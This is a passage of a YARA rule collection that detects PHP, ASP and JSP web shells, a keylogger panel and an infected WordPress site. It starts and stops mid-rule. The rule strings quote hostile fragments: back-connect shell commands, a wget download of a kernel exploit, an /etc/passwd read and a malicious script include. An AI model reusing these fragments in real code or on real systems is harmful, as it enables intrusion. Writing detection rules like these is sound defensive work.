    condition:
        all of them
}
rule HYTop2006_rar_Folder_2006 {
    meta:
        id = "77AZRBnJCJ7JD6s44XoGWw"
        fingerprint = "v1_sha256_536232bbdd21bddb88eefe06a82927abcdd3ed10404c052957896960a6d10932"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file 2006.asp"
        category = "INFO"
        hash = "c19d6f4e069188f19b08fa94d44bc283"

    strings:
        $s6 = "strBackDoor = strBackDoor "
    condition:
        all of them
}
rule r57shell_3 {
    meta:
        id = "1MgjrXR5pT8nVh8KnkcqYq"
        fingerprint = "v1_sha256_0fdca080c7ce57b7bd818a968840aebf3c5c74f188ed062fec794bfadb4e75b0"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file r57shell.php"
        category = "INFO"
        hash = "87995a49f275b6b75abe2521e03ac2c0"

    strings:
        $s1 = "<b>\".$_POST['cmd']"
    condition:
        all of them
}
rule HDConfig {
    meta:
        id = "E0v3TEBohAanu4tPq6QC2"
        fingerprint = "v1_sha256_9001f79db15548cf3ca931d0043d078db7d900ab26093afbf5cd44d0a85800f4"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file HDConfig.exe"
        category = "INFO"
        hash = "7d60e552fdca57642fd30462416347bd"

    strings:
        $s0 = "An encryption key is derived from the password hash. "
        $s3 = "A hash object has been created. "
        $s4 = "Error during CryptCreateHash!"
        $s5 = "A new key container has been created."
        $s6 = "The password has been added to the hash. "
    condition:
        all of them
}
rule FSO_s_ajan_2 {
    meta:
        id = "3PUrq9WvWskiwwOnFXXNsl"
        fingerprint = "v1_sha256_0ac31ee735c94289932369dfba5b408cbf71cc23fd48ce3e09dc7ce640a0d733"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file ajan.asp"
        category = "INFO"
        hash = "22194f8c44524f80254e1b5aec67b03e"

    strings:
        $s2 = "\"Set WshShell = CreateObject(\"\"WScript.Shell\"\")"
        $s3 = "/file.zip"
    condition:
        all of them
}

rule Webshell_and_Exploit_CN_APT_HK : Webshell
{
    meta:
        id = "T5NYlTiPgnrsmyY8dEjwk"
        fingerprint = "v1_sha256_ec3f1e985585e1bf77a46e971a20cd127064a64467761a5a570548dd63ec57e2"
        version = "1.0"
        score = 50
        date = "10.10.2014"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Webshell and Exploit Code in relation with APT against Honk Kong protesters"
        category = "INFO"

strings:
    $a0 = "<script language=javascript src=http://java-se.com/o.js</script>" fullword
    $s0 = "<span style=\"font:11px Verdana;\">Password: </span><input name=\"password\" type=\"password\" size=\"20\">"
    $s1 = "<input type=\"hidden\" name=\"doing\" value=\"login\">"
condition:
    $a0 or ( all of ($s*) )
}

rule JSP_Browser_APT_webshell {
    meta:
        id = "43ely7h7C8vlzoGjntG5Oc"
        fingerprint = "v1_sha256_a352bf394f1b4f70218650758db39225a5a505656299405ccd077592d29480a7"
        version = "1.0"
        score = 60
        date = "10.10.2014"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "F.Roth"
        description = "VonLoesch JSP Browser used as web shell by APT groups - jsp File browser 1.1a"
        category = "INFO"

    strings:
        $a1a = "private static final String[] COMMAND_INTERPRETER = {\"" ascii
        $a1b = "cmd\", \"/C\"}; // Dos,Windows" ascii
        $a2 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));" ascii
        $a3 = "ret.append(\"!!!! Process has timed out, destroyed !!!!!\");" ascii
    condition:
        all of them
}

rule JSP_jfigueiredo_APT_webshell {
    meta:
        id = "uEzsMqDHWGixZS07iK6u3"
        fingerprint = "v1_sha256_7efaca469d09ce7ecba4ed38cb0b07d1b9fc4f45172d2ffb6f5d3259c000fdc5"
        version = "1.0"
        score = 60
        date = "12.10.2014"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "F.Roth"
        description = "JSP Browser used as web shell by APT groups - author: jfigueiredo"
        category = "INFO"
        reference = "http://ceso.googlecode.com/svn/web/bko/filemanager/Browser.jsp"

    strings:
        $a1 = "String fhidden = new String(Base64.encodeBase64(path.getBytes()));" ascii
        $a2 = "<form id=\"upload\" name=\"upload\" action=\"ServFMUpload\" method=\"POST\" enctype=\"multipart/form-data\">" ascii
    condition:
        all of them
}

rule JSP_jfigueiredo_APT_webshell_2 {
    meta:
        id = "586cmiKpDGJou27Y1VFN2k"
        fingerprint = "v1_sha256_f7fa5872d8eb4ba1d0b26d966d7650d70b1a10c56945d5a5340b8e1cb5d0f5f0"
        version = "1.0"
        score = 60
        date = "12.10.2014"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "F.Roth"
        description = "JSP Browser used as web shell by APT groups - author: jfigueiredo"
        category = "INFO"
        reference = "http://ceso.googlecode.com/svn/web/bko/filemanager/"

    strings:
        $a1 = "<div id=\"bkorotator\"><img alt=\"\" src=\"images/rotator/1.jpg\"></div>" ascii
        $a2 = "$(\"#dialog\").dialog(\"destroy\");" ascii
        $s1 = "<form id=\"form\" action=\"ServFMUpload\" method=\"post\" enctype=\"multipart/form-data\">" ascii
        $s2 = "<input type=\"hidden\" id=\"fhidden\" name=\"fhidden\" value=\"L3BkZi8=\" />" ascii
    condition:
        all of ($a*) or all of ($s*)
}

rule AJAX_FileUpload_webshell {
    meta:
        id = "2AQZlkBTvrcMjbd0njam55"
        fingerprint = "v1_sha256_b9e936d03a05f20b51a9ca645227d6a03d855595d9175287193f85338c1a7b1a"
        version = "1.0"
        score = 75
        date = "12.10.2014"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "F.Roth"
        description = "AJAX JS/CSS components providing web shell by APT groups"
        category = "INFO"
        reference = "http://ceso.googlecode.com/svn/web/bko/filemanager/ajaxfileupload.js"

    strings:
        $a1 = "var frameId = 'jUploadFrame' + id;" ascii
        $a2 = "var form = jQuery('<form  action=\"\" method=\"POST\" name=\"' + formId + '\" id=\"' + formId + '\" enctype=\"multipart/form-data\"></form>');" ascii
        $a3 = "jQuery(\"<div>\").html(data).evalScripts();" ascii
    condition:
        all of them
}

rule Webshell_Insomnia {
    meta:
        id = "1Pb1GIxXc3Tub4mAgzS4xG"
        fingerprint = "v1_sha256_d170c60f94092a38ba4af92283debd059eef2e4c683fd7737ffd60d1a2581d9c"
        version = "1.0"
        score = 80
        date = "2014/12/09"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Insomnia Webshell - file InsomniaShell.aspx"
        category = "INFO"
        reference = "http://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/"
        hash = "e0cfb2ffaa1491aeaf7d3b4ee840f72d42919d22"

    strings:
        $s0 = "Response.Write(\"- Failed to create named pipe:\");" fullword ascii
        $s1 = "Response.Output.Write(\"+ Sending {0}<br>\", command);" fullword ascii
        $s2 = "String command = \"exec master..xp_cmdshell 'dir > \\\\\\\\127.0.0.1" ascii
        $s3 = "Response.Write(\"- Error Getting User Info<br>\");" fullword ascii
        $s4 = "string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes," fullword ascii
        $s5 = "[DllImport(\"Advapi32.dll\", SetLastError = true)]" fullword ascii
        $s9 = "username = DumpAccountSid(tokUser.User.Sid);" fullword ascii
        $s14 = "//Response.Output.Write(\"Opened process PID: {0} : {1}<br>\", p" ascii
    condition:
        3 of them
}

rule HawkEye_PHP_Panel {
    meta:
        id = "7C26wSAt3RZx864X0ElkHq"
        fingerprint = "v1_sha256_e29b6df4e3aa3892b10e68218320ac76cecb5a1bbe6c48f2276014b972cbbdd8"
        version = "1.0"
        score = 60
        date = "2014/12/14"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Detects HawkEye Keyloggers PHP Panel"
        category = "INFO"

    strings:
        $s0 = "$fname = $_GET['fname'];" ascii fullword
        $s1 = "$data = $_GET['data'];" ascii fullword
        $s2 = "unlink($fname);" ascii fullword
        $s3 = "echo \"Success\";" fullword ascii
    condition:
        all of ($s*) and filesize < 600
}

rule SoakSoak_Infected_Wordpress {
    meta:
        id = "3L8BZemTvyTOyhXPIwrQ9e"
        fingerprint = "v1_sha256_4cba18a0d14be2795d71a1973265a1742beda57636f64c1974001ecf70e3e91d"
        version = "1.0"
        score = 60
        date = "2014/12/15"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Detects a SoakSoak infected Wordpress site http://goo.gl/1GzWUX"
        category = "INFO"
        reference = "http://goo.gl/1GzWUX"

    strings:
        $s0 = "wp_enqueue_script(\"swfobject\");" ascii fullword
        $s1 = "function FuncQueueObject()" ascii fullword
        $s2 = "add_action(\"wp_enqueue_scripts\", 'FuncQueueObject');" ascii fullword
    condition:
        all of ($s*)
}

rule Pastebin_Webshell {
    meta:
        id = "1yvin57xiBJlPAsZsmMMST"
        fingerprint = "v1_sha256_e71429e9280c37a90ee77be888ae743a86521d3632afc4eeec480b82a22a1445"
        version = "1.0"
        score = 70
        date = "13.01.2015"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Detects a web shell that downloads content from pastebin.com http://goo.gl/7dbyZs"
        category = "INFO"
        reference = "http://goo.gl/7dbyZs"

    strings:
        $s0 = "file_get_contents(\"http://pastebin.com" ascii
        $s1 = "xcurl('http://pastebin.com/download.php" ascii
        $s2 = "xcurl('http://pastebin.com/raw.php" ascii

        $x0 = "if($content){unlink('evex.php');" ascii
        $x1 = "$fh2 = fopen(\"evex.php\", 'a');" ascii

        $y0 = "file_put_contents($pth" ascii
        $y1 = "echo \"<login_ok>" ascii
        $y2 = "str_replace('* @package Wordpress',$temp" ascii
    condition:
        1 of ($s*) or all of ($x*) or all of ($y*)
}

rule ASPXspy2 {
    meta:
        id = "1LKJ5EqIKKjzVq1HHJxpuR"
        fingerprint = "v1_sha256_59c88f8e2542dcde4bf5123147ea2c1ca408925ca966f3f34a4692a3ba7a0935"
        version = "1.0"
        date = "2015/01/24"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web shell - file ASPXspy2.aspx"
        category = "INFO"
        reference = "not set"
        hash = "5642387d92139bfe9ae11bfef6bfe0081dcea197"

    strings:
        $s0 = "string iVDT=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin" ascii
        $s1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" O" ascii
        $s3 = "Process[] p=Process.GetProcesses();" fullword ascii
        $s4 = "Response.Cookies.Add(new HttpCookie(vbhLn,Password));" fullword ascii
        $s5 = "[DllImport(\"kernel32.dll\",EntryPoint=\"GetDriveTypeA\")]" fullword ascii
        $s6 = "<p>ConnString : <asp:TextBox id=\"MasR\" style=\"width:70%;margin:0 8px;\" CssCl" ascii
        $s7 = "ServiceController[] kQmRu=System.ServiceProcess.ServiceController.GetServices();" fullword ascii
        $s8 = "Copyright &copy; 2009 Bin -- <a href=\"http://www.rootkit.net.cn\" target=\"_bla" ascii
        $s10 = "Response.AddHeader(\"Content-Disposition\",\"attachment;filename=\"+HttpUtility." ascii
        $s11 = "nxeDR.Command+=new CommandEventHandler(this.iVk);" fullword ascii
        $s12 = "<%@ import Namespace=\"System.ServiceProcess\"%>" fullword ascii
        $s13 = "foreach(string innerSubKey in sk.GetSubKeyNames())" fullword ascii
        $s17 = "Response.Redirect(\"http://www.rootkit.net.cn\");" fullword ascii
        $s20 = "else if(Reg_Path.StartsWith(\"HKEY_USERS\"))" fullword ascii
    condition:
        6 of them
}


/*
    Yara Rule Set
    Author: Florian Roth
    Date: 2016-01-11
    Identifier: Web Shell Repo
    Reference: https://github.com/nikicat/web-malware-collection
*/

rule Webshell_27_9_c66_c99 {
    meta:
        id = "YSq4RyGtRjqcOAVAN4fUl"
        fingerprint = "v1_sha256_71ae0a3843151a2eec913f62167b23cf9e0c759b18ebe0759174d3503fb23717"
        version = "1.0"
        score = 70
        date = "2016-01-11"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Detects Webshell - rule generated from from files 27.9.txt, c66.php, c99-shadows-mod.php, c99.php ..."
        category = "INFO"
        reference = "https://github.com/nikicat/web-malware-collection"
        hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
        hash2 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
        hash3 = "c377f9316a4c953602879eb8af1fd7cbb0dd35de6bb4747fa911234082c45596"
        hash4 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
        hash5 = "6ce99e07aa98ba6dc521c34cf16fbd89654d0ba59194878dffca857a4c34e57b"
        hash6 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
        hash7 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
        hash8 = "615e768522447558970c725909e064558f33d38e6402c63c92a1a8bc62b64966"
        hash9 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
        hash10 = "a4db77895228f02ea17ff48976e03100ddfaef7c9f48c1d40462872f103451d5"

    strings:
        $s4 = "if (!empty($unset_surl)) {setcookie(\"c99sh_surl\"); $surl = \"\";}" fullword ascii
        $s6 = "@extract($_REQUEST[\"c99shcook\"]);" fullword ascii
        $s7 = "if (!function_exists(\"c99_buff_prepare\"))" fullword ascii
    condition:
        filesize < 685KB and 1 of them
}

rule Webshell_acid_AntiSecShell_3 {
    meta:
        id = "6FzToC0CN5hdNbguGtQV76"
        fingerprint = "v1_sha256_c8c3fcde7afdafe8ead59e24e432fdd4ccae99f96f67b4be3e5a9cd74ff9b2e7"
        version = "1.0"
        score = 70
        date = "2016-01-11"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Detects Webshell Acid"
        category = "INFO"
        reference = "https://github.com/nikicat/web-malware-collection"
        hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
        hash2 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
        hash3 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
        hash4 = "d4424c61fe29d2ee3d8503f7d65feb48341ac2fc0049119f83074950e41194d5"
        hash5 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
        hash6 = "21dd06ec423f0b49732e4289222864dcc055967922d0fcec901d38a57ed77f06"
        hash7 = "c377f9316a4c953602879eb8af1fd7cbb0dd35de6bb4747fa911234082c45596"
        hash8 = "816e699014be9a6d02d5d184eb958c49469d687b7c6fb88e878bca64688a19c9"
        hash9 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
        hash10 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
        hash11 = "615e768522447558970c725909e064558f33d38e6402c63c92a1a8bc62b64966"
        hash12 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
        hash13 = "d0edca7539ef2d30f0b3189b21a779c95b5815c1637829b5594e2601e77cb4dc"
        hash14 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
        hash15 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
        hash16 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"
        hash17 = "a4db77895228f02ea17ff48976e03100ddfaef7c9f48c1d40462872f103451d5"
        hash18 = "1fdf6e142135a34ae1caf1d84adf5e273b253ca46c409b2530ca06d65a55ecbd"

    strings:
        $s0 = "echo \"<option value=delete\".($dspact == \"delete\"?\" selected\":\"\").\">Delete</option>\";" fullword ascii
        $s1 = "if (!is_readable($o)) {return \"<font color=red>\".view_perms(fileperms($o)).\"</font>\";}" fullword ascii
    condition:
        filesize < 900KB and all of them
}

rule Webshell_c99_4 {
    meta:
        id = "2efP9dgD7jtHGnLLQlFTvX"
        fingerprint = "v1_sha256_fa095d8da737e24a913eeadaca2882475366bf5cf0911dd9ff44aaa04871cc0f"
        version = "1.0"
        score = 70
        date = "2016-01-11"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Detects C99 Webshell"
        category = "INFO"
        reference = "https://github.com/nikicat/web-malware-collection"
        hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
        hash2 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
        hash3 = "d4424c61fe29d2ee3d8503f7d65feb48341ac2fc0049119f83074950e41194d5"
        hash4 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
        hash5 = "21dd06ec423f0b49732e4289222864dcc055967922d0fcec901d38a57ed77f06"
        hash6 = "c377f9316a4c953602879eb8af1fd7cbb0dd35de6bb4747fa911234082c45596"
        hash7 = "816e699014be9a6d02d5d184eb958c49469d687b7c6fb88e878bca64688a19c9"
        hash8 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
        hash9 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
        hash10 = "615e768522447558970c725909e064558f33d38e6402c63c92a1a8bc62b64966"
        hash11 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
        hash12 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
        hash13 = "a4db77895228f02ea17ff48976e03100ddfaef7c9f48c1d40462872f103451d5"
        hash14 = "1fdf6e142135a34ae1caf1d84adf5e273b253ca46c409b2530ca06d65a55ecbd"

    strings:
        $s1 = "displaysecinfo(\"List of Attributes\",myshellexec(\"lsattr -a\"));" fullword ascii
        $s2 = "displaysecinfo(\"RAM\",myshellexec(\"free -m\"));" fullword ascii
        $s3 = "displaysecinfo(\"Where is perl?\",myshellexec(\"whereis perl\"));" fullword ascii
        $s4 = "$ret = myshellexec($handler);" fullword ascii
        $s5 = "if (posix_kill($pid,$sig)) {echo \"OK.\";}" fullword ascii
    condition:
        filesize < 900KB and 1 of them
}

rule Webshell_r57shell_2 {
    meta:
        id = "7T8rtpSW21NJ7fzk3I36Ys"
        fingerprint = "v1_sha256_2af51c3d181801b14d5dbb3107cd78cf7ab4a590b7967f231ec707b7ee03fa26"
        version = "1.0"
        score = 70
        date = "2016-01-11"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Detects Webshell R57"
        category = "INFO"
        reference = "https://github.com/nikicat/web-malware-collection"
        hash1 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
        hash2 = "aa957ca4154b7816093d667873cf6bdaded03f820e84d8f1cd5ad75296dd5d4d"
        hash3 = "aa957ca4154b7816093d667873cf6bdaded03f820e84d8f1cd5ad75296dd5d4d"
        hash4 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
        hash5 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
        hash6 = "16b6ec4b80f404f4616e44d8c21978dcdad9f52c84d23ba27660ee8e00984ff2"
        hash7 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
        hash8 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
        hash9 = "c6a5148c81411ec9200810619fa5eec6616800a4d76c988431c272bc8679254f"
        hash10 = "c6a5148c81411ec9200810619fa5eec6616800a4d76c988431c272bc8679254f"
        hash11 = "59ea6cf16ea06ff47cf0e6a398df2eaec4d329707b8c3201fc63cbf0b7c85519"
        hash12 = "0e0227a0001b38fb59fc07749e80c9d298ff0e6aca126ea8f4ea68ebc9a3661f"
        hash13 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"

    strings:
        $s1 = "$connection = @ftp_connect($ftp_server,$ftp_port,10);" fullword ascii
        $s2 = "echo $lang[$language.'_text98'].$suc.\"\\r\\n\";" fullword ascii
    condition:
        filesize < 900KB and all of them
}

rule Webshell_27_9_acid_c99_locus7s {
    meta:
        id = "6ZyF3FK8DLxqdOlFTxJxXi"
        fingerprint = "v1_sha256_3005c09dfcb1f2e33a09ed73e28ef889c74e1f5daf619dd272e0b9b30cdb0f94"
        version = "1.0"
        score = 70
        date = "2016-01-11"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Detects Webshell - rule generated from from files 27.9.txt, acid.php, c99_locus7s.txt"
        category = "INFO"
        reference = "https://github.com/nikicat/web-malware-collection"
        hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
        hash2 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
        hash3 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
        hash4 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
        hash5 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
        hash6 = "5ae121f868555fba112ca2b1a9729d4414e795c39d14af9e599ce1f0e4e445d3"
        hash7 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
        hash8 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"

    strings:
        $s0 = "$blah = ex($p2.\" /tmp/back \".$_POST['backconnectip'].\" \".$_POST['backconnectport'].\" &\");" fullword ascii
        $s1 = "$_POST['backcconnmsge']=\"</br></br><b><font color=red size=3>Error:</font> Can't backdoor host!</b>\";" fullword ascii
    condition:
        filesize < 1711KB and 1 of them
}

rule Webshell_Backdoor_PHP_Agent_r57_mod_bizzz_shell_r57 {
    meta:
        id = "1nIbAhbVHz65neMXTHTf4a"
        fingerprint = "v1_sha256_76c441fdde667c58ab013a20c44580cd70113adfee76f1a2436992b7e546ba4c"
        version = "1.0"
        score = 70
        date = "2016-01-11"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Detects Webshell - rule generated from from files Backdoor.PHP.Agent.php, r57.mod-bizzz.shell.txt ..."
        category = "INFO"
        reference = "https://github.com/nikicat/web-malware-collection"
        hash1 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
        hash2 = "f51a5c5775d9cca0b137ddb28ff3831f4f394b7af6f6a868797b0df3dcdb01ba"
        hash3 = "16b6ec4b80f404f4616e44d8c21978dcdad9f52c84d23ba27660ee8e00984ff2"
        hash4 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
        hash5 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
        hash6 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
        hash7 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
        hash8 = "c6a5148c81411ec9200810619fa5eec6616800a4d76c988431c272bc8679254f"
        hash9 = "59ea6cf16ea06ff47cf0e6a398df2eaec4d329707b8c3201fc63cbf0b7c85519"
        hash10 = "0e0227a0001b38fb59fc07749e80c9d298ff0e6aca126ea8f4ea68ebc9a3661f"
        hash11 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"

    strings:
        $s1 = "$_POST['cmd'] = which('" ascii
        $s2 = "$blah = ex(" fullword ascii
    condition:
        filesize < 600KB and all of them
}

rule Webshell_c100 {
    meta:
        id = "3AntoKRtl2KewbAudNQaSA"
        fingerprint = "v1_sha256_cc8c59f70f5ec6c89812b1597e9b864e358593ea5782e359cd483dee1a84b28b"
        version = "1.0"
        score = 70
        date = "2016-01-11"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Detects Webshell - rule generated from from files c100 v. 777shell"
        category = "INFO"
        reference = "https://github.com/nikicat/web-malware-collection"
        hash1 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
        hash2 = "d4424c61fe29d2ee3d8503f7d65feb48341ac2fc0049119f83074950e41194d5"
        hash3 = "21dd06ec423f0b49732e4289222864dcc055967922d0fcec901d38a57ed77f06"
        hash4 = "c377f9316a4c953602879eb8af1fd7cbb0dd35de6bb4747fa911234082c45596"
        hash5 = "816e699014be9a6d02d5d184eb958c49469d687b7c6fb88e878bca64688a19c9"
        hash6 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
        hash7 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"

    strings:
        $s0 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)" fullword ascii
        $s1 = "<center>Kernel Info: <form name=\"form1\" method=\"post\" action=\"http://google.com/search\">" fullword ascii
        $s3 = "cut -d: -f1,2,3 /etc/passwd | grep ::" ascii
        $s4 = "which wget curl w3m lynx" ascii
        $s6 = "netstat -atup | grep IST"  ascii
    condition:
        filesize < 685KB and 2 of them
}

rule Webshell_AcidPoison {
    meta:
        id = "5P6oS8TBKszcf01nKON4vE"
        fingerprint = "v1_sha256_31add38bcdc33d5e4b825bfa18ff1a47d5aa5aaeebd8e3adac533c471aa30629"
        version = "1.0"
        score = 70
        date = "2016-01-11"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Detects Poison Sh3ll - Webshell"
        category = "INFO"
        reference = "https://github.com/nikicat/web-malware-collection"
        hash1 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
        hash2 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
        hash3 = "d0edca7539ef2d30f0b3189b21a779c95b5815c1637829b5594e2601e77cb4dc"
        hash4 = "d0edca7539ef2d30f0b3189b21a779c95b5815c1637829b5594e2601e77cb4dc"
        hash5 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
        hash6 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
        hash7 = "be541cf880a8e389a0767b85f1686443f35b508d1975ee25e1ce3f08fa32cfb5"
        hash8 = "be541cf880a8e389a0767b85f1686443f35b508d1975ee25e1ce3f08fa32cfb5"
        hash9 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"
        hash10 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"

    strings:
        $s1 = "elseif ( enabled(\"exec\") ) { exec($cmd,$o); $output = join(\"\\r\\n\",$o); }" fullword ascii
    condition:
        filesize < 550KB and all of them
}

rule Webshell_acid_FaTaLisTiCz_Fx_fx_p0isoN_sh3ll_x0rg_byp4ss_256 {
    meta:
        id = "2KjGBZJO2LhKL44Bi7snVc"
        fingerprint = "v1_sha256_07cd255247c9a77b1c9b6049a2b96632252ea9572880b10991c6797c14a05d48"
        version = "1.0"
        score = 70
        date = "2016-01-11"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Detects Webshell - rule generated from from files acid.php, FaTaLisTiCz_Fx.txt, fx.txt, p0isoN.sh3ll.txt, x0rg.byp4ss.txt"
        category = "INFO"
        reference = "https://github.com/nikicat/web-malware-collection"
        hash1 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
        hash2 = "d0edca7539ef2d30f0b3189b21a779c95b5815c1637829b5594e2601e77cb4dc"
